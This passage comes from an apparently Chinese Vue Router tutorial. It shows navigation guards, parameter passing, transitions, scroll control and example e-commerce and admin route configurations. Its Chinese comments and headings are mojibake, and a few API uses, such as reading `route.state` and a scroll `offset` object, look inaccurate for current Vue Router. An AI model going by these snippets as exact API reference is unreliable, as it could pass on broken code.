<span class="hljs-comment">// å…¨å±€å‰ç½®å®ˆå«</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 1. é¡µé¢æ ‡é¢˜</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> || <span class="hljs-string">'é»˜è®¤æ ‡é¢˜'</span>
  
  <span class="hljs-comment">// 2. æƒé™éªŒè¯</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span> &amp;&amp; !authStore.<span class="hljs-property">isLoggedIn</span>) {
    <span class="hljs-title function_">next</span>({
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
      <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: to.<span class="hljs-property">fullPath</span> }
    })
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// 3. ç®¡ç†å‘˜æƒé™</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAdmin</span> &amp;&amp; !authStore.<span class="hljs-property">isAdmin</span>) {
    <span class="hljs-title function_">next</span>(<span class="hljs-string">'/unauthorized'</span>)
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// 4. ç»´æŠ¤æ¨¡å¼æ£€æŸ¥</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">maintenance</span> &amp;&amp; !isMaintenanceMode) {
    <span class="hljs-title function_">next</span>(<span class="hljs-keyword">from</span>.<span class="hljs-property">path</span> || <span class="hljs-string">'/'</span>)
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// 5. æ»šåŠ¨è¡Œä¸ºé‡ç½®</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">resetScroll</span>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
  }
  
  <span class="hljs-title function_">next</span>()
})

<span class="hljs-comment">// å…¨å±€è§£æå®ˆå«ï¼ˆé€‚åˆè·å–æ•°æ®ï¼‰</span>
router.<span class="hljs-title function_">beforeResolve</span>(<span class="hljs-keyword">async</span> (to, <span class="hljs-keyword">from</span>, next) =&gt; {
  <span class="hljs-comment">// é¢„å–æ•°æ®</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresData</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">'fetchRequiredData'</span>, to.<span class="hljs-property">params</span>)
      <span class="hljs-title function_">next</span>()
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/error'</span>)
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>()
  }
})

<span class="hljs-comment">// å…¨å±€åç½®å®ˆå«</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// 1. é¡µé¢è®¿é—®ç»Ÿè®¡</span>
  analytics.<span class="hljs-title function_">trackPageView</span>(to.<span class="hljs-property">fullPath</span>)
  
  <span class="hljs-comment">// 2. å…³é—­åŠ è½½åŠ¨ç”»</span>
  <span class="hljs-title function_">hideLoading</span>()
  
  <span class="hljs-comment">// 3. ä¿å­˜å¯¼èˆªå†å²</span>
  <span class="hljs-title function_">saveNavigationHistory</span>(to, <span class="hljs-keyword">from</span>)
  
  <span class="hljs-comment">// 4. æ›´æ–°é¢åŒ…å±‘</span>
  <span class="hljs-title function_">updateBreadcrumb</span>(to)
})

<span class="hljs-comment">// ç»„ä»¶å†…å®ˆå«</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">beforeRouteEnter</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// ä¸èƒ½è®¿é—® thisï¼Œå› ä¸ºç»„ä»¶è¿˜æ²¡åˆ›å»º</span>
    <span class="hljs-comment">// ä½†å¯ä»¥é€šè¿‡å›è°ƒè®¿é—®</span>
    <span class="hljs-title function_">next</span>(<span class="hljs-function"><span class="hljs-params">vm</span> =&gt;</span> {
      <span class="hljs-comment">// é€šè¿‡ vm è®¿é—®ç»„ä»¶å®ä¾‹</span>
      vm.<span class="hljs-title function_">loadData</span>(to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
    })
  },
  
  <span class="hljs-title function_">beforeRouteUpdate</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// åœ¨å½“å‰è·¯ç”±æ”¹å˜ï¼Œä½†æ˜¯è¯¥ç»„ä»¶è¢«å¤ç”¨æ—¶è°ƒç”¨</span>
    <span class="hljs-comment">// å¯ä»¥è®¿é—®ç»„ä»¶å®ä¾‹ this</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">productId</span> = to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fetchProductData</span>()
    <span class="hljs-title function_">next</span>()
  },
  
  <span class="hljs-title function_">beforeRouteLeave</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// å¯¼èˆªç¦»å¼€è¯¥ç»„ä»¶çš„å¯¹åº”è·¯ç”±æ—¶è°ƒç”¨</span>
    <span class="hljs-comment">// å¯ä»¥è®¿é—®ç»„ä»¶å®ä¾‹ this</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hasUnsavedChanges</span>) {
      <span class="hljs-keyword">const</span> answer = <span class="hljs-title function_">confirm</span>(<span class="hljs-string">'æœ‰æœªä¿å­˜çš„æ›´æ”¹ï¼Œç¡®å®šç¦»å¼€å—ï¼Ÿ'</span>)
      <span class="hljs-keyword">if</span> (!answer) {
        <span class="hljs-title function_">next</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">// å–æ¶ˆå¯¼èˆª</span>
        <span class="hljs-keyword">return</span>
      }
    }
    <span class="hljs-title function_">next</span>()
  }
}
</code></pre>
<h4 data-id="heading-18">6.2 å®ˆå«ç»„åˆå®è·µ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å°è£…å®ˆå«å‡½æ•°</span>
<span class="hljs-keyword">const</span> guard = {
  <span class="hljs-comment">// è®¤è¯å®ˆå«</span>
  <span class="hljs-attr">auth</span>: <span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!authStore.<span class="hljs-property">isLoggedIn</span>) {
      <span class="hljs-title function_">next</span>({
        <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
        <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: to.<span class="hljs-property">fullPath</span> }
      })
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">next</span>()
    }
  },
  
  <span class="hljs-comment">// æƒé™å®ˆå«</span>
  <span class="hljs-attr">role</span>: <span class="hljs-function">(<span class="hljs-params">requiredRole</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!authStore.<span class="hljs-title function_">hasRole</span>(requiredRole)) {
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/forbidden'</span>)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">next</span>()
    }
  },
  
  <span class="hljs-comment">// åŠŸèƒ½å¼€å…³å®ˆå«</span>
  <span class="hljs-attr">feature</span>: <span class="hljs-function">(<span class="hljs-params">featureName</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!featureToggle.<span class="hljs-title function_">isEnabled</span>(featureName)) {
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/feature-disabled'</span>)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">next</span>()
    }
  },
  
  <span class="hljs-comment">// æ•°æ®é¢„å–å®ˆå«</span>
  <span class="hljs-attr">prefetch</span>: <span class="hljs-function">(<span class="hljs-params">dataKey</span>) =&gt;</span> <span class="hljs-keyword">async</span> (to, <span class="hljs-keyword">from</span>, next) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">`fetch<span class="hljs-subst">${dataKey}</span>`</span>, to.<span class="hljs-property">params</span>)
      <span class="hljs-title function_">next</span>()
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/error'</span>)
    }
  }
}

<span class="hljs-comment">// åœ¨è·¯ç”±ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminLayout</span>,
    <span class="hljs-attr">beforeEnter</span>: [guard.<span class="hljs-property">auth</span>, guard.<span class="hljs-title function_">role</span>(<span class="hljs-string">'admin'</span>)],
    <span class="hljs-attr">children</span>: [
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'analytics'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-title class_">Analytics</span>,
        <span class="hljs-attr">beforeEnter</span>: guard.<span class="hljs-title function_">feature</span>(<span class="hljs-string">'analytics'</span>)
      }
    ]
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/product/:id'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">ProductDetail</span>,
    <span class="hljs-attr">beforeEnter</span>: guard.<span class="hljs-title function_">prefetch</span>(<span class="hljs-string">'Product'</span>)
  }
]
</code></pre>
<h3 data-id="heading-19">ä¸ƒã€é«˜çº§è·³è½¬æŠ€å·§</h3>
<h4 data-id="heading-20">7.1 è·¯ç”±ä¼ å‚çš„å¤šç§æ–¹å¼</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ–¹å¼1ï¼šparamsï¼ˆè·¯å¾„å‚æ•°ï¼‰</span>
<span class="hljs-comment">// è·¯ç”±é…ç½®ï¼š/user/:id</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/123'</span> })
<span class="hljs-comment">// æˆ–</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'User'</span>, <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> } })

<span class="hljs-comment">// æ–¹å¼2ï¼šqueryï¼ˆæŸ¥è¯¢å‚æ•°ï¼‰</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'/search'</span>, <span class="hljs-attr">query</span>: { <span class="hljs-attr">q</span>: <span class="hljs-string">'vue'</span>, <span class="hljs-attr">page</span>: <span class="hljs-number">2</span> } })

<span class="hljs-comment">// æ–¹å¼3ï¼špropsï¼ˆæ¨èæ–¹å¼ï¼‰</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'User'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">User</span>,
    <span class="hljs-attr">props</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// params è½¬ä¸º props</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/product/:id'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Product'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Product</span>,
    <span class="hljs-attr">props</span>: <span class="hljs-function"><span class="hljs-params">route</span> =&gt;</span> ({
      <span class="hljs-attr">id</span>: <span class="hljs-title class_">Number</span>(route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>),
      <span class="hljs-attr">preview</span>: route.<span class="hljs-property">query</span>.<span class="hljs-property">preview</span> === <span class="hljs-string">'true'</span>
    })
  }
]

<span class="hljs-comment">// æ–¹å¼4ï¼šstateï¼ˆä¸æ˜¾ç¤ºåœ¨URLä¸­ï¼‰</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Checkout'</span>,
  <span class="hljs-attr">state</span>: {
    <span class="hljs-attr">cartItems</span>: [...],
    <span class="hljs-attr">discount</span>: <span class="hljs-string">'SAVE10'</span>,
    <span class="hljs-attr">source</span>: <span class="hljs-string">'promotion'</span>
  }
})

<span class="hljs-comment">// æ¥æ”¶state</span>
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()
<span class="hljs-keyword">const</span> cartItems = route.<span class="hljs-property">state</span>?.<span class="hljs-property">cartItems</span> || []

<span class="hljs-comment">// æ–¹å¼5ï¼šmetaï¼ˆè·¯ç”±å…ƒä¿¡æ¯ï¼‰</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/premium'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Premium</span>,
    <span class="hljs-attr">meta</span>: {
      <span class="hljs-attr">requiresSubscription</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">subscriptionLevel</span>: <span class="hljs-string">'gold'</span>
    }
  }
]

<span class="hljs-comment">// æ–¹å¼6ï¼šåŠ¨æ€propsä¼ é€’</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">navigateWithProps</span>(<span class="hljs-params">target, props</span>) {
  <span class="hljs-comment">// ä¸´æ—¶å­˜å‚¨props</span>
  <span class="hljs-keyword">const</span> propKey = <span class="hljs-string">`temp_props_<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>`</span>
  sessionStorage.<span class="hljs-title function_">setItem</span>(propKey, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(props))
  
  router.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">path</span>: target,
    <span class="hljs-attr">query</span>: { <span class="hljs-attr">_props</span>: propKey }
  })
}

<span class="hljs-comment">// åœ¨ç›®æ ‡ç»„ä»¶ä¸­è¯»å–</span>
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()
<span class="hljs-keyword">const</span> propsData = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> propKey = route.<span class="hljs-property">query</span>.<span class="hljs-property">_props</span>
  <span class="hljs-keyword">if</span> (propKey) {
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(sessionStorage.<span class="hljs-title function_">getItem</span>(propKey) || <span class="hljs-string">'{}'</span>)
    sessionStorage.<span class="hljs-title function_">removeItem</span>(propKey)
    <span class="hljs-keyword">return</span> data
  }
  <span class="hljs-keyword">return</span> {}
})
</code></pre>
<h4 data-id="heading-21">7.2 è·³è½¬åŠ¨ç”»å’Œè¿‡æ¸¡</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- è·¯ç”±è¿‡æ¸¡åŠ¨ç”» --&gt;
  &lt;router-view v-slot="{ Component, route }"&gt;
    &lt;transition 
      :name="route.meta.transition || 'fade'"
      mode="out-in"
      @before-enter="beforeEnter"
      @after-enter="afterEnter"
    &gt;
      &lt;component :is="Component" :key="route.path" /&gt;
    &lt;/transition&gt;
  &lt;/router-view&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  methods: {
    beforeEnter() {
      // åŠ¨ç”»å¼€å§‹å‰
      document.body.classList.add('page-transition')
    },
    afterEnter() {
      // åŠ¨ç”»ç»“æŸå
      document.body.classList.remove('page-transition')
    }
  }
}
&lt;/script&gt;

&lt;style&gt;
/* æ·¡å…¥æ·¡å‡º */
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.3s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

/* æ»‘åŠ¨æ•ˆæœ */
.slide-left-enter-active,
.slide-left-leave-active {
  transition: transform 0.3s ease;
}

.slide-left-enter-from {
  transform: translateX(100%);
}

.slide-left-leave-to {
  transform: translateX(-100%);
}

/* ç¼©æ”¾æ•ˆæœ */
.zoom-enter-active,
.zoom-leave-active {
  transition: all 0.3s ease;
}

.zoom-enter-from {
  opacity: 0;
  transform: scale(0.9);
}

.zoom-leave-to {
  opacity: 0;
  transform: scale(1.1);
}
&lt;/style&gt;
</code></pre>
<h4 data-id="heading-22">7.3 æ»šåŠ¨è¡Œä¸ºæ§åˆ¶</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
  routes,
  
  <span class="hljs-comment">// æ»šåŠ¨è¡Œä¸ºæ§åˆ¶</span>
  <span class="hljs-title function_">scrollBehavior</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, savedPosition</span>) {
    <span class="hljs-comment">// 1. è¿”å›æŒ‰é’®ä¿æŒä½ç½®</span>
    <span class="hljs-keyword">if</span> (savedPosition) {
      <span class="hljs-keyword">return</span> savedPosition
    }
    
    <span class="hljs-comment">// 2. å“ˆå¸Œå¯¼èˆª</span>
    <span class="hljs-keyword">if</span> (to.<span class="hljs-property">hash</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">el</span>: to.<span class="hljs-property">hash</span>,
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>  <span class="hljs-comment">// å¹³æ»‘æ»šåŠ¨</span>
      }
    }
    
    <span class="hljs-comment">// 3. ç‰¹å®šè·¯ç”±æ»šåŠ¨åˆ°é¡¶éƒ¨</span>
    <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">scrollToTop</span> !== <span class="hljs-literal">false</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span> }
    }
    
    <span class="hljs-comment">// 4. ä¿æŒå½“å‰ä½ç½®</span>
    <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">keepScroll</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }
    
    <span class="hljs-comment">// 5. æ»šåŠ¨åˆ°æŒ‡å®šå…ƒç´ </span>
    <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">scrollTo</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">el</span>: to.<span class="hljs-property">meta</span>.<span class="hljs-property">scrollTo</span>,
        <span class="hljs-attr">offset</span>: { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">20</span> }  <span class="hljs-comment">// åç§»é‡</span>
      }
    }
    
    <span class="hljs-comment">// é»˜è®¤è¡Œä¸º</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">left</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">top</span>: <span class="hljs-number">0</span> }
  }
})
</code></pre>
<h3 data-id="heading-23">å…«ã€å®é™…é¡¹ç›®åº”ç”¨</h3>
<h4 data-id="heading-24">8.1 ç”µå•†ç½‘ç«™è·¯ç”±è·³è½¬ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// router/index.js - ç”µå•†è·¯ç”±é…ç½®</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>,
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'é¦–é¡µ - ç”µå•†å¹³å°'</span> }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/products'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'ProductList'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">ProductList</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'å•†å“åˆ—è¡¨'</span>,
      <span class="hljs-attr">keepAlive</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// ä¿æŒç»„ä»¶çŠ¶æ€</span>
    },
    <span class="hljs-attr">props</span>: <span class="hljs-function"><span class="hljs-params">route</span> =&gt;</span> ({
      <span class="hljs-attr">category</span>: route.<span class="hljs-property">query</span>.<span class="hljs-property">category</span>,
      <span class="hljs-attr">sort</span>: route.<span class="hljs-property">query</span>.<span class="hljs-property">sort</span> || <span class="hljs-string">'default'</span>,
      <span class="hljs-attr">page</span>: <span class="hljs-built_in">parseInt</span>(route.<span class="hljs-property">query</span>.<span class="hljs-property">page</span>) || <span class="hljs-number">1</span>
    })
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/product/:id(\\d+)'</span>,  <span class="hljs-comment">// åªåŒ¹é…æ•°å­—ID</span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">'ProductDetail'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">ProductDetail</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'å•†å“è¯¦æƒ…'</span>,
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">false</span>
    },
    <span class="hljs-attr">beforeEnter</span>: <span class="hljs-keyword">async</span> (to, <span class="hljs-keyword">from</span>, next) =&gt; {
      <span class="hljs-comment">// éªŒè¯å•†å“æ˜¯å¦å­˜åœ¨</span>
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> productStore.<span class="hljs-title function_">fetchProduct</span>(to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
        <span class="hljs-title function_">next</span>()
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-title function_">next</span>(<span class="hljs-string">'/404'</span>)
      }
    }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/cart'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'ShoppingCart'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">ShoppingCart</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'è´­ç‰©è½¦'</span>,
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>
    }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/checkout'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Checkout'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Checkout</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'ç»“ç®—'</span>,
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">requiresCart</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// éœ€è¦è´­ç‰©è½¦æœ‰å•†å“</span>
    },
    <span class="hljs-attr">beforeEnter</span>: <span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (cartStore.<span class="hljs-property">isEmpty</span>) {
        <span class="hljs-title function_">next</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'ShoppingCart'</span> })
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">next</span>()
      }
    }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/order/:orderId'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'OrderDetail'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">OrderDetail</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">title</span>: <span class="hljs-string">'è®¢å•è¯¦æƒ…'</span>,
      <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">scrollToTop</span>: <span class="hljs-literal">true</span>
    }
  },
  <span class="hljs-comment">// ... å…¶ä»–è·¯ç”±</span>
]

<span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-comment">// æŸ¥çœ‹å•†å“</span>
    <span class="hljs-title function_">viewProduct</span>(<span class="hljs-params">product</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">name</span>: <span class="hljs-string">'ProductDetail'</span>,
        <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: product.<span class="hljs-property">id</span> },
        <span class="hljs-attr">query</span>: { 
          <span class="hljs-attr">source</span>: <span class="hljs-string">'list'</span>,
          <span class="hljs-attr">ref</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>.<span class="hljs-property">fullPath</span> 
        }
      })
    },
    
    <span class="hljs-comment">// åŠ å…¥è´­ç‰©è½¦</span>
    <span class="hljs-title function_">addToCart</span>(<span class="hljs-params">product</span>) {
      cartStore.<span class="hljs-title function_">add</span>(product).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// æ˜¾ç¤ºæˆåŠŸæç¤ºåè·³è½¬</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$message</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'åŠ å…¥è´­ç‰©è½¦æˆåŠŸ'</span>)
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">name</span>: <span class="hljs-string">'ShoppingCart'</span>,
          <span class="hljs-attr">query</span>: { <span class="hljs-attr">added</span>: product.<span class="hljs-property">id</span> }
        })
      })
    },
    
    <span class="hljs-comment">// ç«‹å³è´­ä¹°</span>
    <span class="hljs-title function_">buyNow</span>(<span class="hljs-params">product</span>) {
      cartStore.<span class="hljs-title function_">add</span>(product).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">replace</span>({
          <span class="hljs-attr">name</span>: <span class="hljs-string">'Checkout'</span>,
          <span class="hljs-attr">query</span>: { <span class="hljs-attr">quick</span>: <span class="hljs-string">'true'</span> }
        })
      })
    },
    
    <span class="hljs-comment">// ç»§ç»­è´­ç‰©</span>
    <span class="hljs-title function_">continueShopping</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// è¿”å›ä¹‹å‰çš„å•†å“åˆ—è¡¨ï¼Œä¿æŒç­›é€‰çŠ¶æ€</span>
      <span class="hljs-keyword">const</span> returnTo = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>.<span class="hljs-property">query</span>.<span class="hljs-property">ref</span> || <span class="hljs-string">'/products'</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>(returnTo)
    }
  }
}
</code></pre>
<h4 data-id="heading-25">8.2 åå°ç®¡ç†ç³»ç»Ÿè·¯ç”±ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŠ¨æ€è·¯ç”±åŠ è½½</span>
<span class="hljs-keyword">let</span> dynamicRoutesLoaded = <span class="hljs-literal">false</span>

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
  <span class="hljs-attr">routes</span>: [
    {
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
      <span class="hljs-attr">name</span>: <span class="hljs-string">'Login'</span>,
      <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/views/Login.vue'</span>),
      <span class="hljs-attr">meta</span>: { <span class="hljs-attr">guest</span>: <span class="hljs-literal">true</span> }
    },
    {
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
      <span class="hljs-attr">component</span>: <span class="hljs-title class_">Layout</span>,
      <span class="hljs-attr">children</span>: [
        {
          <span class="hljs-attr">path</span>: <span class="hljs-string">''</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">'Dashboard'</span>,
          <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/views/Dashboard.vue'</span>),
          <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'ä»ªè¡¨æ¿'</span>, <span class="hljs-attr">icon</span>: <span class="hljs-string">'dashboard'</span> }
        }
      ]
    }
  ]
})

<span class="hljs-comment">// åŠ¨æ€åŠ è½½è·¯ç”±</span>
